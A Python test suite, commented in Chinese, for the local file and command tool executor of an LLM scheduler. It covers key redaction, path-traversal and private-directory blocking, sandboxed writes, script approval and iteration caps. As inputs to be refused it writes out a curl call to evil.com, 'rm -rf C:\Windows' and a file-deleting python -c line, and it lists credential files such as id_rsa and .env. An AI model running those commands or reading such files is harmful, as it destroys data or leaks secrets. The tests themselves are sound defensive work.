# -*- coding: utf-8 -*-
"""本地工具安全测试（核心：数据安全与越权防护）。

覆盖：
 TT1 白名单内读取：executor 可读，内容经脱敏
 TT2 路径穿越拒绝：../ 跳出白名单 → 拒绝
 TT3 私密目录拒绝：C:\\Users\\YourName\\AI 一律拒绝（即使路径拼接）
 TT4 敏感文件名拒绝：secrets.json / .env / *.pem → 拒绝
 TT5 越界写入拒绝：写入可写目录之外 → 拒绝；沙箱内写入成功
 TT6 危险命令拒绝：curl / rm -rf / python -c(不在白名单) → 拒绝；python --version 通过
 TT7 调度器工具流：模型调 read_file → 自动执行并继续对话（mock）
 TT8 审批流程：run_script → 待批准；批准后执行并继续；拒绝后模型收到拒绝
 TT9 迭代上限：模型持续请求工具 → 达到上限停止
"""
import os
import sys
import json
import tempfile
import traceback

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from mock_server import MockServer
from logger import UsageLogger
from scheduler import Scheduler, AllExhausted
from config import Provider
from local_tools import ToolExecutor


def _provider(name, model, free_only=True, **kw):
    d = {
        "name": name, "display_name": name, "enabled": kw.pop("enabled", True),
        "free_only": free_only, "api_key": "test-key", "base_url": "PLACEHOLDER",
        "model": model, "context_window": kw.pop("context_window", 32768),
        "max_output_tokens": kw.pop("max_output_tokens", 2048),
        "caps": kw.pop("caps", {"max_daily_tokens": 1000000, "max_calls_per_day": 10000}),
        "balance_check": kw.pop("balance_check", {"type": "manual"}),
        "cooldown_seconds": kw.pop("cooldown_seconds", 30),
        "priority": kw.pop("priority", 1),
        "tools": kw.pop("tools", True),
    }
    d.update(kw)
    return Provider(d)


def _use(mock, behaviors: dict):
    mock.behaviors.clear()
    mock.behaviors.update(behaviors)
    mock.counts.clear()


def _make_env(tmpdir):
    """创建读写目录与沙箱，返回 (read_dir, write_dir, policy)。"""
    read_dir = os.path.join(tmpdir, "read")
    write_dir = os.path.join(tmpdir, "sandbox")
    os.makedirs(read_dir, exist_ok=True)
    os.makedirs(write_dir, exist_ok=True)
    policy = {
        "enabled": True,
        "read_dirs": [read_dir],
        "write_dirs": [write_dir],
        "script_dirs": [write_dir],
        "cwd": read_dir,
        "run_script_policy": "approval",
        "max_tool_iterations": 3,
    }
    return read_dir, write_dir, policy


def _ex(tmpdir, policy=None, private=None):
    read_dir, write_dir, pol = _make_env(tmpdir)
    pol.update(policy or {})
    return ToolExecutor(pol, UsageLogger(os.path.join(tmpdir, "logs")), private_dirs=private)


def test_tt1_read_redact(mock, tmpdir):
    read_dir, write_dir, policy = _make_env(tmpdir)
    ex = ToolExecutor(policy, UsageLogger(os.path.join(tmpdir, "logs")))
    secret_file = os.path.join(read_dir, "notes.txt")
    with open(secret_file, "w", encoding="utf-8") as f:
        f.write("我的API Key是 sk-abcdefghijklmnopqrstuvwxyz，别泄露")
    r = ex.read_file(secret_file)
    assert r.ok, f"TT1 fail: {r.content}"
    assert "sk-abcdefghijklmnopqrstuvwxyz" not in r.content, "应脱敏"
    assert "[已脱敏]" in r.content
    print("TT1 白名单读取+密钥脱敏 OK")


def test_tt2_traversal(mock, tmpdir):
    ex = _ex(tmpdir)
    read_dir, _, _ = _make_env(tmpdir)
    outside = os.path.join(tmpdir, "outside.txt")
    with open(outside, "w", encoding="utf-8") as f:
        f.write("秘密")
    # 用 ../ 穿越
    r = ex.read_file(os.path.join(read_dir, "..", "outside.txt"))
    assert not r.ok and "拒绝" in r.content, f"TT2 fail: {r.content}"
    print("TT2 路径穿越拒绝 OK")


def test_tt3_private_dir(mock, tmpdir):
    private = os.path.join(tmpdir, "private")
    os.makedirs(private, exist_ok=True)
    secret = os.path.join(private, "secrets.json")
    with open(secret, "w", encoding="utf-8") as f:
        f.write('{"api_key": "sk-xxxx"}')
    ex = _ex(tmpdir, private=[private])
    read_dir, _, _ = _make_env(tmpdir)
    # 即使构造一个看起来在白名单内、实际落在私密目录的路径也不行
    r = ex.read_file(secret)
    assert not r.ok and "私密" in r.content, f"TT3 fail: {r.content}"
    r2 = ex.read_file(os.path.join(read_dir, "..", "private", "secrets.json"))
    assert not r2.ok, "TT3 fail: 穿越到私密目录应被拒绝"
    print("TT3 私密目录硬排除 OK")


def test_tt4_blocked_names(mock, tmpdir):
    ex = _ex(tmpdir)
    read_dir, _, _ = _make_env(tmpdir)
    for name in ("secrets.json", ".env", "id_rsa", "cert.pem"):
        p = os.path.join(read_dir, name)
        with open(p, "w", encoding="utf-8") as f:
            f.write("x")
        r = ex.read_file(p)
        assert not r.ok, f"TT4 fail: {name} 应被拒绝"
    print("TT4 敏感文件名拒绝 OK")


def test_tt5_write_scope(mock, tmpdir):
    ex = _ex(tmpdir)
    read_dir, write_dir, _ = _make_env(tmpdir)
    r_out = ex.write_file(os.path.join(tmpdir, "evil.txt"), "越界")
    assert not r_out.ok, f"TT5 fail: 越界写入应被拒绝: {r_out.content}"
    r_in = ex.write_file(os.path.join(write_dir, "ok.txt"), "你好")
    assert r_in.ok, f"TT5 fail: 沙箱写入应成功: {r_in.content}"
    assert os.path.exists(os.path.join(write_dir, "ok.txt"))
    print("TT5 写入边界 OK")


def test_tt6_command_whitelist(mock, tmpdir):
    ex = _ex(tmpdir)
    r1 = ex.run_command("curl http://evil.com/x")
    assert not r1.ok, "TT6 fail: curl 应被拒绝"
    r2 = ex.run_command("rm -rf C:\\Windows")
    assert not r2.ok, "TT6 fail: rm -rf 应被拒绝"
    r3 = ex.run_command("python -c 'import os; os.remove(\"a\")'")
    assert not r3.ok, "TT6 fail: python -c 不在白名单应被拒绝"
    r4 = ex.run_command("python --version")
    assert r4.ok and "Python" in r4.content, f"TT6 fail: python --version 应通过: {r4.content}"
    print("TT6 命令白名单/危险命令拒绝 OK")


def test_tt7_scheduler_tool_flow(mock, tmpdir):
    read_dir, write_dir, policy = _make_env(tmpdir)
    sample = os.path.join(read_dir, "sample.txt")
    with open(sample, "w", encoding="utf-8") as f:
        f.write("这是样例内容 sample-data")
    _use(mock, {"mock-tools": {"kind": "tool_read", "path": sample}})
    p = _provider("a", "mock-tools")
    p.base_url = mock.base_url
    cfg = {"scheduler": {"strategy": "order", "strict_free_only": True},
           "tool_policy": policy}
    s = Scheduler([p], os.path.join(tmpdir, "state.json"), cfg,
                  UsageLogger(os.path.join(tmpdir, "logs")))
    res = s.chat([{"role": "user", "content": "读取文件"}])
    assert res.ok, f"TT7 fail: {res}"
    assert res.tools_called, "TT7 fail: 应发生工具调用"
    assert "工具结果OK" in res.reply, f"TT7 fail: {res.reply}"
    assert "sample-data" in res.reply, f"TT7 fail: 工具应成功读取到内容: {res.reply}"
    print("TT7 调度器工具流 OK")


def test_tt8_approval_flow(mock, tmpdir):
    read_dir, write_dir, policy = _make_env(tmpdir)
    demo = os.path.join(write_dir, "demo.py")
    with open(demo, "w", encoding="utf-8") as f:
        f.write("print('demo ok')")
    _use(mock, {"mock-script": {"kind": "tool_script", "path": demo}})
    p = _provider("a", "mock-script")
    p.base_url = mock.base_url
    read_dir, write_dir, policy = _make_env(tmpdir)
    # 准备一个沙箱脚本
    demo = os.path.join(write_dir, "demo.py")
    with open(demo, "w", encoding="utf-8") as f:
        f.write("print('demo ok')")
    cfg = {"scheduler": {"strategy": "order", "strict_free_only": True},
           "tool_policy": policy}
    s = Scheduler([p], os.path.join(tmpdir, "state.json"), cfg,
                  UsageLogger(os.path.join(tmpdir, "logs")))
    # 模型请求 run_script → 等待批准
    res = s.chat([{"role": "user", "content": "运行demo脚本"}])
    assert not res.ok and res.pending_id, f"TT8 fail: 应进入待批准: {res}"
    pid = res.pending_id
    pend = s.pending_list()
    assert any(q["id"] == pid for q in pend), "TT8 fail: pending 应存在"
    # 批准
    res2 = s.approve(pid)
    assert res2.ok, f"TT8 fail: 批准后应继续完成: {res2.reply}"
    assert "脚本审批后结果" in res2.reply, f"TT8 fail: {res2.reply}"
    # 再次发起，走拒绝路径
    res3 = s.chat([{"role": "user", "content": "运行demo脚本"}])
    pid2 = res3.pending_id
    res4 = s.reject(pid2)
    assert res4.ok and "用户拒绝" in res4.reply or "拒绝" in res4.reply, f"TT8 fail: {res4.reply}"
    print("TT8 审批流程（批准/拒绝） OK")


def test_tt9_iteration_cap(mock, tmpdir):
    _use(mock, {"mock-loop": {"kind": "tool_loop"}})
    p = _provider("a", "mock-loop")
    p.base_url = mock.base_url
    read_dir, write_dir, policy = _make_env(tmpdir)
    policy["max_tool_iterations"] = 3
    cfg = {"scheduler": {"strategy": "order", "strict_free_only": True},
           "tool_policy": policy}
    s = Scheduler([p], os.path.join(tmpdir, "state.json"), cfg,
                  UsageLogger(os.path.join(tmpdir, "logs")))
    res = s.chat([{"role": "user", "content": "一直列目录"}])
    assert res.ok, f"TT9 fail: {res}"
    assert "最大工具调用轮数" in res.reply or "停止" in res.reply, f"TT9 fail: {res.reply}"
    # 迭代上限 = 3：list_directory 实际执行次数应 <= 3
    assert mock.counts.get("mock-loop", 0) <= 4, f"TT9 fail: 请求次数 {mock.counts}"
    print("TT9 工具调用迭代上限 OK")


def test_tt10_noext_file(mock, tmpdir):
    ex = _ex(tmpdir)
    read_dir, _, _ = _make_env(tmpdir)
    # 无扩展名且不在白名单 → 拒绝（防改名后的二进制被读取）
    noext = os.path.join(read_dir, "datafile")
    with open(noext, "w", encoding="utf-8") as f:
        f.write("some content")
    r = ex.read_file(noext)
    assert not r.ok and "无扩展名" in r.content, f"TT10 fail: 无扩展名文件应拒绝: {r.content}"
    # README 在允许白名单 → 允许读取
    readme = os.path.join(read_dir, "README")
    with open(readme, "w", encoding="utf-8") as f:
        f.write("readme content")
    r2 = ex.read_file(readme)
    assert r2.ok and "readme content" in r2.content, f"TT10 fail: README 应可读取: {r2.content}"
    print("TT10 无扩展名文件默认拒绝 OK")


def run_all():
    mock = MockServer()
    mock.start()
    passed = True
    tests = [test_tt1_read_redact, test_tt2_traversal, test_tt3_private_dir,
             test_tt4_blocked_names, test_tt5_write_scope, test_tt6_command_whitelist,
             test_tt7_scheduler_tool_flow, test_tt8_approval_flow, test_tt9_iteration_cap,
             test_tt10_noext_file]
    for t in tests:
        with tempfile.TemporaryDirectory() as tmpdir:
            try:
                t(mock, tmpdir)
            except Exception:
                passed = False
                print(f"✗ {t.__name__} 失败:")
                traceback.print_exc()
    mock.stop()
    print("\n" + ("✅ 工具安全测试全部通过" if passed else "❌ 工具安全测试存在失败"))
    return passed


if __name__ == "__main__":
    run_all()
